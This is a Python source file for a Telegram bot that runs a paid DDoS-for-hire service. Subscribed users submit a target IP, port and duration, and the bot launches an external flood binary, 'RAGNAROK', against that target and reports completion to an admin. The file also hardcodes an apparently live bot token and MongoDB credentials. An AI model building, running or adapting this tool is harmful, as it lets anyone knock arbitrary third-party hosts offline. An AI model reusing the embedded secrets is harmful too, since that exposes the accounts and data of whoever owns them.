import os
import telebot
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Bot Configuration
TOKEN = '7716334217:AAERUgMJsePHPQ9paUbcMHudWyBJT3tNITA'
ADMIN_USER_ID = 7022875343
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
USERNAME = "@Anony1764"  # Bot username

# Attack Status Variable
attack_in_progress = False

# Logging Configuration
logging.basicConfig(format='%(asctime)s - ⚔️ %(message)s', level=logging.INFO)

# MongoDB Connection
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['sharp']
users_collection = db.users

# Bot Initialization
bot = telebot.TeleBot(TOKEN)

# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Asyncio Loop for Background Tasks
loop = asyncio.get_event_loop()

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(1)

# Attack Function
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the flag to indicate an attack is in progress

    try:
        process = await asyncio.create_subprocess_shell(
            f"./RAGNAROK {target_ip} {target_port} {duration} CRACKS",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if process.returncode != 0:
            logging.error(f"Attack failed with return code {process.returncode}: {stderr.decode()}")
        else:
            logging.info(f"Attack completed successfully: {stdout.decode()}")

    except Exception as e:
        logging.error(f"Error during attack: {e}")
    finally:
        attack_in_progress = False  # Reset the flag after the attack is complete
        notify_attack_finished(target_ip, target_port, duration)

# Notify Admin When Attack Finishes
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_USER_ID,
        f"🔥 *Attack Completed!* 🔥\n\n"
        f"🎯 Target: `{target_ip}`\n"
        f"🚪 Port: `{target_port}`\n"
        f"⏳ Duration: `{duration} seconds`\n\n"
        f"✅ Operation finished. Powered by {USERNAME}.",
        parse_mode='Markdown'
    )

# Start Command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("⚔️ Start Attack"), KeyboardButton("📊 Check Status"))
    bot.send_message(
        message.chat.id,
        f"👋 Welcome to the Bot, {message.from_user.first_name}!\n\n"
        f"Use the buttons below to interact with the bot.\n\n"
        f"Bot by {USERNAME}.",
        reply_markup=markup,
        parse_mode='Markdown'
    )

# Attack Command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    global attack_in_progress
    chat_id = message.chat.id

    # Check if an attack is already in progress
    if attack_in_progress:
        bot.send_message(chat_id, "⚠️ An attack is already in progress. Please wait until it completes.")
        return

    user_id = message.from_user.id

    try:
        # Check user access
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "🚫 Unauthorized. You do not have access to this command.")
            return

        bot.send_message(chat_id, "📝 Provide target details – IP, Port, Duration (seconds).")
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Attack command error: {e}")

# Process Attack Command
def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "⚠️ Incorrect format. Use: /Attack <IP> <Port> <Duration>")
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 Port {target_port} is restricted. Choose a different port.")
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(
            message.chat.id,
            f"⚔️ *Attack Initiated!* ⚔️\n\n"
            f"🎯 Target: `{target_ip}`\n"
            f"🚪 Port: `{target_port}`\n"
            f"⏳ Duration: `{duration} seconds`\n\n"
            f"✅ Attack started. Stand by for completion.",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error in process_attack_command: {e}")

# Status Command
@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data:
        response = (
            f"📊 *Your Status:*\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"📅 Plan: `{user_data.get('plan', 'N/A')}`\n"
            f"⏳ Valid Until: `{user_data.get('valid_until', 'N/A')}`\n\n"
            f"Bot by {USERNAME}."
        )
    else:
        response = "🚫 You are not registered. Contact the admin for access."
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

# Handle Button Presses
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "⚔️ Start Attack":
        attack_command(message)
    elif message.text == "📊 Check Status":
        check_status(message)
    else:
        bot.send_message(message.chat.id, "❌ Unknown command. Use the buttons or type /start.")

# Start Asyncio Thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

# Main Function
if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("🚀 Bot is operational and ready.")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")